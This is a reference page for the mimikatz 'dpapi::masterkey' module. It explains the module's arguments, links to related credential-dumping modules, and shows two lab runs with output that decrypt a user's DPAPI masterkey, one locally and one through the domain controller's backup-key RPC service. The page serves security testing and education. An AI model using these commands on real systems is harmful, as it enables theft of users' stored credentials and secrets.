# masterkey

`dpapi::masterkey` describes a Masterkey file and unprotects each Masterkey (key depending). In other words, it can decrypt and request masterkeys from active directory (cf. [dumping DPAPI secrets](https://www.thehacker.recipes/ad-ds/movement/credentials/dumping/dpapi-protected-secrets)). It has the following command line arguments:

* `/in`: The path of the masterkey. The masterkeys are stored at `C:\Users\<UserName>\AppData\Roaming\Microsoft\Protect\<SID>\<MasterKey>`
* `/dc`: the target domain controller
* `/rpc`: it can be used to remotely decrypt the masterkey of the target user by contacting the domain controller`.` According to Benjamin, in a domain, a domain controller runs an RPC Service to deal with encrypted masterkeys for users, [MS-BKRP](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-BKRP/\[MS-BKRP].pdf) (Backupkey Remote Protocol).
* `/sid`: the target user's Security Identifier
* `/pvk`: the path to the private key file. It can be obtained through [`lsadump::backupkeys /export`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/backupkeys).
* `/hash`: the SHA1 hash of the target user's password. It can be found through [`sekurlsa::logonpasswords`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/logonpasswords).
* /system: The DPAPI\_SYSTEM key. It can be found through [`lsadump::secrets`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/secrets).
* `/domain`: the target active directory domain
* `/password`: the target user's password
* `/protected`: it defines the user account as a protected one

{% hint style="info" %}
The `dpapi::cred` can also display the masterkey location through the _**guidMasterKey**_ value.
{% endhint %}

The following examples were taken from Benjamin's [howto \~ credential manager saved credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-\~-credential-manager-saved-credentials) guide.

```
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1719172562-3308538836-3929312420-1104\cc6eb538-28f1-4ab4-adf2-f5594e88f0b2"
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {cc6eb538-28f1-4ab4-adf2-f5594e88f0b2}
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 704f7ca8be647c20dc36e8ae4127966b
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 1277546c39d446616022d57823d8337b20b89ef8077dd68acdf65a38ef60310ab66175eeb766a39d66cdc0cb7332e220ca76b532602f36520a3a6809fb50893c9d4ae050e0072b44fe522c8f4b4f1f610001530c4f770c76b347ea02fc7baa627efc9e1055255600

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 3afaf040c982786cfa36342d8005a16f
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : d9c4e107b6eda306d7b4bf09a23693165d2faa6d52f509c0c4a8cbf08950919024176739d11d82d1e4e6f1659cd8a193a50bd809848d4dec11439e3da6bb4f66ab4b04aff3ae48e1

[domainkey]
  **DOMAINKEY**
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : {9c71e914-1ed5-4338-8461-4dcc363553be}
    pbSecret         : dd39d20bd5ea9b9b677c1ada3da052cc240476185020337a96df497bd9b46dbf499d5c02d341721d55d3087ac1effacd3cfa4c94413d541f476db2179a9b7ba6b383a28b1d52b165b84d73f27395e6093b883142168c783659a7b9756a787f688154b6fda15e8d0581b1f23c44870f825fd03ee3d52652e3c2e98f946deee7b86a9b3534d210b3f53e4fe29b7ed19050c5981f186ae9f3d8d11228e83c908c2e303d17bca0d625df400731454880f6dda9a7b65afff6198c8f8e580e72bb01ce8faf0d1c1bdac662f6b29698416be99616e0311fe2043660d066c09ab5298a25fb8d911987a89491ab4ef0df529cf1aef5da0340e9da9313a50a94aea0a7010a
    pbAccesscheck    : 2c5332354ab0bf2ec0fdb17489661e8785532feb72fc491c978cec342f714665e570904642434cc3852ef18cd96575899fa2a6f46b1f37c9ae3e63e5bb5de12151016bb0afd0efd79ddbbad6c0f36931a11503864d3bd403
```

```
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1719172562-3308538836-3929312420-1104\cc6eb538-28f1-4ab4-adf2-f5594e88f0b2" /rpc
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {cc6eb538-28f1-4ab4-adf2-f5594e88f0b2}

[...]

[domainkey] with RPC
[DC] 'lab.local' will be the domain
[DC] 'dc.lab.local' will be the DC server
  key : 3ed054e284b5d47796f4779a2c0de63ca0ea9c63ce9e3f6868e2dd4f1113f6f3c55d9c1e21d2378c4499f98c0682991647dfd5f60b4f05034163ff59651e4ad4
  sha1: 81c99543dea591c11f20d69027ea2016d89d07dd
```
